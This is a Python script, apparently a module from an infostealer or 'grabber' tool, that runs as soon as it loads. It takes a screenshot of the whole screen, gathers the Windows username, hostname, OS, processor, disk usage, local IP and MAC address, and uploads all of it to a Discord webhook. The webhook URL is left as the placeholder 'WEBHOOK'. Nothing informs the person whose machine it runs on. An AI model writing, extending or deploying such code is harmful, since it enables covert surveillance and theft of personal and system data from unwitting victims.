import os
import platform
import psutil
import socket
import subprocess
from discord import Embed, SyncWebhook, File
from typing import Literal
import getmac
from PIL import ImageGrab

class SystemInfo(object):
    def __init__(self, webhook: str) -> None:
        self.webhook = SyncWebhook.from_url(webhook)
        self.embed = Embed(title='System Info', color=0x000000)
        self.run()

    def run(self) -> None:
      screenshot_file = 'screenshot.png'
      ImageGrab.grab().save(screenshot_file)

      data = [
          ('User', self.user_data()),
          ('System', self.system_data()),
          ('Disk', self.disk_data()),
          ('Network', self.network_data())
      ]
      for name, value in data:
          self.embed.add_field(name=name, value=f'```{value}```', inline=False)

      try:

          with open(screenshot_file, 'rb') as f:
              file = File(f)
              self.embed.set_image(url=f'attachment://{screenshot_file}')

          self.webhook.send(
              embed=self.embed,
              username='SystemInfo',
              file=file
          )

      except Exception as e:
          print(f'Error: {e}')

    def user_data(self) -> str:
        display_name = os.getenv('USERNAME')
        hostname = os.getenv('COMPUTERNAME')
        username = os.getenv('USERPROFILE').split('\\')[-1]
        return f'Name: {display_name}\nHostname: {hostname}\nUsername: {username}'

    def system_data(self) -> str:
        system = platform.system()
        release = platform.release()
        machine = platform.machine()
        processor = platform.processor()
        python_version = platform.python_version()
        return f'OS: {system} {release}\nArchitecture: {machine}\nProcessor: {processor}\nPython version: {python_version}'

    def disk_data(self) -> str:
        partitions = psutil.disk_partitions()
        disk_usage = psutil.disk_usage('/')
        disk_info = ''
        for partition in partitions:
            try:
                partition_usage = psutil.disk_usage(partition.mountpoint)
                disk_info += f'\n{partition.device} ({partition.mountpoint}): {partition_usage.used/1024**3:.2f}GB used / {partition_usage.total/1024**3:.2f}GB total'
            except:
                pass
        return f'Total disk usage: {disk_usage.used/1024**3:.2f}GB used / {disk_usage.total/1024**3:.2f}GB total'

    def network_data(self) -> str:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        cmd = subprocess.Popen(['ipconfig', '/all'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        output = cmd.communicate()[0].decode('cp1252')
        mac_address = getmac.get_mac_address()
        return f'Hostname: {hostname}\nLocal IP: {local_ip}\nMAC Address: {mac_address}'

SystemInfo('WEBHOOK')